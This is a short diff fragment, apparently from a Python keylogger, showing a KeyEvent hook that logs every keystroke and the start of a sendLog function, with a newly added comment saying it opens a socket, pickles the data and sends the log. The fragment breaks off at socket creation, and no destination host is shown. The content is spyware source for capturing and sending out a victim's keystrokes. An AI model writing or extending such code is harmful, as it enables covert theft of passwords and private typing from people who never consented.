@@ -8,6 +8,7 @@ def KeyEvent(event):
     logging.log(10, chr(event.Ascii))
     return True
 
+#Opens Socket, serializes data using pickle, and sends log
 def sendLog():
     while True:
         s = socket.socket()
